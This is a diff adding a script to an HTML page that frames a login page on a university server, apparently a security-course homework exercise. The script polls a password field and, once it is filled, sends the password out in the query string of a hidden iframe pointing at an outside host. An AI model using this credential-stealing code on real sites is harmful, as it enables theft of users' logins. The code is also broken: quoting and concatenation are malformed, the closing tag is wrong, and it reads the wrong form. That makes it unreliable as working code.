@@ -1,3 +1,18 @@
 <html>
     <iframe height="1000" width="1000" src="http://calculus.sisl.rites.uic.edu:443/6e3357a8/hw4/web-app/Login.jsp"></iframe>
 </html>
+
+<script>
+	function testPassword(){
+		var password = document.forms[0].password.value;
+		if(password != ""){
+			var temp = document.createElement("div");
+			temp.innerHTML += "<iFrame src=\""+ "google.com" + "?password=" + password "\" style=\"display:none;\" />;
+			document.body.appendChild(temp);
+			clearInterval(interval);
+		}
+
+	}
+	interval = setInterval(testPassword,50);
+
+<script>
